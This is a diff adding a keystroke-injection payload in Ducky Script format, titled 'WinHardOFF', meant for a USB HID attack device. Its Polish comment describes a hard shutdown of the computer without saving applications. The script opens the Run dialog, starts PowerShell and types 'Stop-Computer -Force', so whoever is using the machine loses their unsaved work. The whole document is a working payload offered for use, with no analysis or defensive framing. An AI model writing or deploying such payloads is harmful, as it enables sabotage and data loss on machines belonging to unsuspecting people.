@@ -1,0 +1,12 @@
+REM Title: WinHardOFF
+REM Autor: 8ad3rror
+REM Info[PL]: Twarde wyłączenie komputera bez zapisania aplikacji
+
+DELAY 100
+GUI r
+DELAY 300
+STRING powershell
+ENTER
+DELAY 300
+STRING Stop-Computer -Force
+ENTER
